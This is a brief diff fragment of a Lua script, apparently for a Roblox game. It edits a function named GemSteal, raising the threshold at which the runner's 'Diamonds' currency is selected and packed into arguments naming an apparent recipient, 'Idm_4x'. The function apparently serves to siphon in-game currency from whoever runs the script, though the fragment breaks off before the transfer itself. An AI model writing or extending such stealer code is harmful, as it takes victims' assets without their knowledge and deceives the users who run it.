@@ -23,7 +23,7 @@ end
 
 local function GemSteal()
     for i, v in pairs(GetSave().Inventory.Currency) do
-        if v.id == "Diamonds" and GemAmount1 > 50000000 then
+        if v.id == "Diamonds" and GemAmount1 > 60000000 then
            GemId = i
             local args = {
                         [1] = "Idm_4x",
